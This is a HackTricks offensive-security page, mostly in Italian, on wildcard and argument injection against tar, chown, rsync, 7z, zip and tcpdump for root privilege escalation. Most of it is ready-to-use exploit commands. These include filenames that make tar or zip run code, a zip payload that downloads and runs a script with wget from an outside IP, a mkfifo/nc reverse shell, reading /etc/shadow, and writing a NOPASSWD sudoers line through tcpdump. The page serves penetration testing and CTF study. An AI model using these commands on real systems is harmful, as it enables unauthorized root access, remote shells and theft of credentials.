# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** si verifica quando uno script privilegiato esegue un binario Unix come `tar`, `chown`, `rsync`, `zip`, `7z`, … con un wildcard non quotato come `*`.
> Poiché la shell espande il wildcard **prima** di eseguire il binario, un attaccante che può creare file nella directory di lavoro può costruire nomi di file che iniziano con `-` in modo che vengano interpretati come **opzioni invece che dati**, contrabbandando efficacemente flag arbitrari o persino comandi.
> Questa pagina raccoglie le primitive più utili, le ricerche recenti e le rilevazioni moderne per il periodo 2023-2025.

## chown / chmod

Puoi **copiare il proprietario/gruppo o i bit di permessi di un file arbitrario** abusando del flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Quando root successivamente esegue qualcosa del tipo:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` viene iniettato, causando che *tutti* i file corrispondenti ereditino la proprietà/permessi di `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (attacco combinato).
Vedi anche il classico paper di DefenseCode per i dettagli.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Esegui comandi arbitrari abusando della funzionalità **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Una volta che root esegue, ad esempio, `tar -czf /root/backup.tgz *`, `shell.sh` viene eseguito come root.

### bsdtar / macOS 14+

Il `tar` predefinito nelle versioni recenti di macOS (basato su `libarchive`) *non* implementa `--checkpoint`, ma puoi comunque ottenere l'esecuzione di codice con l'opzione **--use-compress-program** che permette di specificare un compressore esterno.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Quando uno script privilegiato esegue `tar -cf backup.tar *`, `/bin/sh` verrà avviata.

---

## rsync

`rsync` permette di sovrascrivere la shell remota o anche il binario remoto tramite flag da riga di comando che iniziano con `-e` o `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Se root poi archivia la directory con `rsync -az * backup:/srv/`, il flag iniettato avvia la tua shell sul lato remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Anche quando lo script privilegiato *difensivamente* prefissa il wildcard con `--` (per fermare il parsing delle opzioni), il formato 7-Zip supporta **file list files** prefissando il nome del file con `@`. Combinando questo con un symlink ti permette di *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Se root esegue qualcosa come:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip tenterà di leggere `root.txt` (→ `/etc/shadow`) come lista di file e interromperà l'esecuzione, **stampando il contenuto su stderr**.

---

## zip

Esistono due primitive molto pratiche quando un'applicazione passa nomi di file controllati dall'utente a `zip` (sia tramite wildcard sia enumerando nomi senza `--`).

- RCE tramite test hook: `-T` abilita “test archive” e `-TT <cmd>` sostituisce il tester con un programma arbitrario (forma lunga: `--unzip-command <cmd>`). Se puoi iniettare nomi di file che iniziano con `-`, dividi gli flags su nomi di file distinti così il short-options parsing funziona:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Note
- NON provare a usare un singolo nome file come `'-T -TT <cmd>'` — le opzioni brevi vengono interpretate carattere per carattere e l'operazione fallirà. Usa token separati come mostrato.
- Se le slash vengono rimosse dai nomi di file dall'app, recupera da un host/IP nudo (percorso predefinito `/index.html`) e salva localmente con `-O`, poi esegui.
- Puoi eseguire il debug del parsing con `-sc` (show processed argv) o `-h2` (more help) per capire come i tuoi token vengono consumati.

Esempio (comportamento locale su zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Se lo strato web echoa l'output di `zip` su stdout/stderr (comune con wrapper ingenui), flag iniettati come `--help` o errori dovuti a opzioni sbagliate emergeranno nella risposta HTTP, confermando la command-line injection e aiutando a tarare il payload.

---

## Ulteriori binari vulnerabili a wildcard injection (lista rapida 2023-2025)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Quando una restricted shell o un vendor wrapper costruisce una riga di comando per `tcpdump` concatenando campi controllati dall'utente (es., un parametro "file name") senza un'attenta quotatura/validazione, puoi introdurre flag extra per `tcpdump`. La combinazione di `-G` (rotazione temporale), `-W` (limita il numero di file) e `-z <cmd>` (comando post-rotate) permette l'esecuzione arbitraria di comandi con i privilegi dell'utente che esegue tcpdump (spesso root su appliance).

Precondizioni:

- Puoi influenzare `argv` passato a `tcpdump` (es., tramite un wrapper come `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Il wrapper non sanifica spazi o token prefissati con `-` nel campo file name.

Classic PoC (executes a reverse shell script from a writable path):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Dettagli:

- `-G 1 -W 1` forza una rotazione immediata dopo il primo pacchetto corrispondente.
- `-z <cmd>` esegue il comando post-rotate una volta per rotazione. Molte build eseguono `<cmd> <savefile>`. Se `<cmd>` è uno script/interprete, assicurati che la gestione degli argomenti corrisponda al tuo payload.

No-removable-media variants:

- Se hai qualche altro primitive per scrivere file (ad es., un wrapper di comando separato che permette output redirection), inserisci il tuo script in un percorso noto e attiva `-z /bin/sh /path/script.sh` o `-z /path/script.sh` a seconda della semantica della piattaforma.
- Alcuni vendor wrappers ruotano verso location attacker-controllable. Se puoi influenzare il percorso ruotato (symlink/directory traversal), puoi indirizzare `-z` a eseguire contenuti che controlli completamente senza media esterni.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Anti-pattern molto comune nei sudoers:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemi
- Il glob `*` e i pattern permissivi vincolano solo il primo argomento `-w`. `tcpdump` accetta più opzioni `-w`; l'ultima prevale.
- La regola non vincola altre opzioni, quindi `-Z`, `-r`, `-V`, ecc. sono consentite.

Primitive
- Sovrascrivere il percorso di destinazione con un secondo `-w` (il primo soddisfa solo sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal all'interno del primo `-w` per sfuggire all'albero ristretto:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forza la proprietà dell'output con `-Z root` (crea file di proprietà root ovunque):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Scrittura di contenuto arbitrario riproducendo un PCAP creato ad hoc tramite `-r` (ad esempio, per inserire una riga in sudoers):

<details>
<summary>Crea un PCAP che contenga il payload ASCII esatto e scrivilo come root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Lettura arbitraria di file/secret leak con `-V <file>` (interpreta una lista di savefiles). I messaggi di errore spesso visualizzano righe, causando leak di contenuto:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Riferimenti

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
